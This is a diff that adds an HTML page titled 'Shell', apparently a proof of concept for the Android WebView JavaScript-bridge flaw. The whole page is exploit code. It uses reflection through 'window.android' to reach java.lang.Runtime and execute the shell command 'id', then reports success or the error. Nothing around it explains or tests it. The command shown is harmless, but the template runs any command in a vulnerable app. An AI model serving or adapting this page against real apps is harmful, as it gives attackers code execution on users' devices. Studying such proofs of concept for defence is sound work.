@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>Shell</title>
+</head>
+<body>
+<script>
+try {
+    var runtime = window.android.getClass().forName('java.lang.Runtime');
+    var process = runtime.getMethod('getRuntime').invoke(null);
+    var exec = runtime.getMethod('exec', 'java.lang.String');
+    var result = exec.invoke(process, 'id');
+    document.write('Executed');
+} catch (e) {
+    document.write('Error: ' + e);
+}
+</script>
+</body>
+</html>
